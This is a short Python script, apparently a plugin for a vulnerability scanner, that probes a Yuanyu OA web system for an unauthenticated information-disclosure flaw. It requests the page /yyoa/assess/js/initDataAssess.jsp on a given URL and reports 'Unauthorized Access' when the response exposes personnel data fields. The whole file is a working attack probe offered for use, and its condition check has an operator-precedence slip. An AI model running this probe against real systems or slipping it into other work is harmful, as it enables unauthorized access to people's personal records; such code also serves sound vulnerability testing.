# coding:utf-8
# http://www.yuanyuoa.com
import requests

class Exploit:

    def attack(self, url):
        path = "/yyoa/assess/js/initDataAssess.jsp"
        target = url+path

        response = requests.get(target)
        if response.status_code == 200 and 'insertObject' in response.text or 'personList' in response.text:
            return '{} Unauthorized Access!!!!'.format(target)

# print Exploit().attack('http://www.yuanyuoa.com')